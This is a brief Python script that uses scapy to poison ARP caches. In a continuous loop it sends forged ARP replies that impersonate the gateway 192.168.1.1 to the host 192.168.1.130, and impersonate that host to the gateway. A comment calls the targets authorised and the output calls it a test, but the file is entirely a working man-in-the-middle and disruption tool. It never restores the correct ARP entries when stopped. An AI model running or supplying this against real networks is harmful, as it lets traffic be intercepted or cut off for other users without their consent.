from scapy.all import ARP, send
import time

def spoof(target_ip, gateway_ip):
    # Op=2 indicates an ARP reply
    # We tell target_ip that we are gateway_ip
    packet = ARP(op=2, pdst=target_ip, psrc=gateway_ip)
    send(packet, verbose=False)

# Authorized test targets
TARGET = "192.168.1.130"
GATEWAY = "192.168.1.1"

try:
    print("Starting ARP disruption for testing...")
    while True:
        spoof(TARGET, GATEWAY)
        spoof(GATEWAY, TARGET)
        time.sleep(2)
except KeyboardInterrupt:
    print("Test stopped.")
